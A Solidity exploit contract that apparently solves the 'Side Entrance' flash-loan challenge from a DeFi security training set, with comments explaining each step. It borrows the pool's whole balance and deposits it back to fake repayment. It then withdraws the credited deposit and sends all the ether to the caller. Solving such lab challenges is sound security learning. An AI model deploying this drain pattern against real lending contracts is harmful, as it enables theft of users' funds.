pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}
interface ISideEntranceLenderPool {
    function flashLoan(uint256) external payable;
    function deposit() external payable;
    function withdraw() external payable;
}
contract hackSideEntrance is IFlashLoanEtherReceiver{
    function execute() override external payable {
        // Step 2 : This function will be called by the flashLoan function of the pool contract. 
        // We will deposit the flashLoaned ether back to the contract via deposit function. 
        // In this way, the balance check in the flashLoan is passed but since we used deposit, contract will allow us to withdraw.  
        ISideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function hackit(address payable poolContractAddress) external payable { 

        //Step 1: Call the flashLoan function from the pool contract. 
        // the flashLoan function from the pool contract will call the execute function mentioned above. 
        // In the execute function above we will deposit the flashloaned ether. 
        uint _amount = poolContractAddress.balance;
        ISideEntranceLenderPool(poolContractAddress).flashLoan(_amount);

        //For Step-2 Check above 

        //For Step-3, we withdraw that eth and transfer to the our wallet. 
        ISideEntranceLenderPool(poolContractAddress).withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }   
    receive() external payable{}
}